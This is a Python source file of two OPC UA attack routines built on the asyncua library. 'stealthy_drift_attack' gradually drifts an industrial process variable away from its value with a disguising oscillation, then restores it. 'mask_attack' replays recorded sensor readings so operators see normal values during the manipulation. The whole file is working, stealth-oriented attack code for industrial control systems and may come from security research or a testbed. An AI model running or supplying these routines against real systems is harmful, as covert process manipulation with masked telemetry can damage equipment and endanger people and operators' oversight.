import asyncio, math
from asyncua import Node, Client #type:ignore
from asyncua.ua import VariantType # type:ignore
from typing import Iterable, List, Tuple, Any

async def stealthy_drift_attack(client:Client, 
                        target:Node,
                        duration:float,
                        rate:float,
                        drift:float,
                        oscil: float,
                        period:float):
                           
    original = await target.read_value()
    base_value = float(original)

    interval = 1.0/ rate
    loop = asyncio.get_event_loop()

    half_duration = duration/2
    # Calculate coeff from given period
    coeff = (2*math.pi) /period
    try:
	    # Initial phase time 
        start_up = loop.time()
        next_tick = start_up
        end_time_up = start_up + half_duration
        # For the duration increase to the drift target 
        while loop.time() < end_time_up:
            now = loop.time()
            elapsed = now - start_up
            # defines the part of the drift 
            frac = min(max(elapsed/half_duration, 0.0), 1.0)
            # Drift from original to goal
            mean = base_value + (drift * frac)
            # Oscillate aroind the drift mean
            osc = oscil * math.cos(coeff*elapsed)
            value = mean + osc
            await target.write_value(value, VariantType.Double)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
    finally:
        # Final phase time 
        start_down = loop.time()
        next_tick = start_down
        end_time_down = start_down + half_duration
        # Slowly come back down to original value
        while loop.time() < end_time_down:
            now = loop.time()
            elapsed_back = now - start_down
            # Defines part of the drift back 
            frac_back = min(max(elapsed_back/half_duration, 0.0), 1.0)
            #Drift from goal to original
            mean = base_value + drift*(1 - frac_back)
            # oscillate around the drift mean
            osc = oscil * math.cos(coeff*(half_duration + elapsed_back))
            value = mean + osc 
            await target.write_value(value, VariantType.Double)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
        await target.write_value(original, VariantType.Double)


async def mask_attack(client:Client, 
                           duration:float,
                           rate:float,
                           mask_nodes: Iterable[Node]):
	masks: List[Tuple[Node, Any]] = []
	# Add original values to reset after
	for node in mask_nodes:
		masks.append((node, await node.read_value()))
	# Sample amount
	sample_count = 8
	sample_interval = 1
	loop = asyncio.get_event_loop()
	# buffers for the masks
	mask_buffers: List[List[Any]] = [[value] for _, value in masks]
	# Collect the rest of the samples
	for _ in range(sample_count-1):
		read_tasks = [node.read_value() for node, _ in masks]
		values = await asyncio.gather(*read_tasks)
		for buff, val in zip(mask_buffers,values):
			buff.append(val)
		await asyncio.sleep(1)
	# Sample pattern to avoid jumps
	forward = list(range(sample_count))
	backward = list(range(sample_count -2, -1, -1))
	pattern = forward + backward
	pattern_len= len(pattern)
	pattern_idx=0
	# Tming
	interval = 1.0/ rate
	writes_per = max(1, int(round(1.0/interval)))
	end_time = loop.time() + duration
	try:
		while loop.time() < end_time:
			# Index playthrough for writes 
			idx = pattern[pattern_idx]
			pattern_idx = (pattern_idx +1)%pattern_len
			# Same value at rate 
			for _ in range(writes_per):
				# Break if > 
				if loop.time() >= end_time:
					break
				writes = []
				# Build writes
				for (node,_), buff in zip(masks, mask_buffers):
					writes.append(node.write_value(buff[idx], VariantType.Double))
				# Write
				await asyncio.gather(*writes)
				await asyncio.sleep(interval)
	finally:
		tasks = [node.write_value(value, VariantType.Double) for node, value in masks]
		await asyncio.gather(*tasks)
        